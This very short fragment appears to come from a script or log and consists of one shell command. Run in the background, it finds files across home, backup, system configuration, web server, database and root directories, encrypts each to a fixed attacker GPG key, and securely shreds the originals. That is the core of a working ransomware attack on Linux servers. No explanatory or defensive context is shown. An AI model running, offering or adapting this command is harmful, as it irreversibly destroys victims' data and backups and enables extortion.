...
nohup find /home /backup /var /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /usr/lib /usr/share /usr/local /usr/src /opt /root/* -type f ! -name '*.ENC' -exec gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
